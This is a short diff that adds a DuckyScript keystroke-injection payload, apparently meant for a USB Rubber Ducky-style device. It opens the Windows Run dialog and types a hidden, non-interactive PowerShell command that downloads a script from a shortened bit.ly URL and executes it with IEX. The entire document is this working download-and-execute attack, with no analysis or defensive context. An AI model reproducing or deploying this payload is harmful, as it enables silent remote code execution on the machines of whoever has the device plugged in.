@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -W Hidden -nop -noni -c "IEX (New-Object Net.Webclient).downloadstring('http://bit.ly/2rRwpvp')"
+ENTER
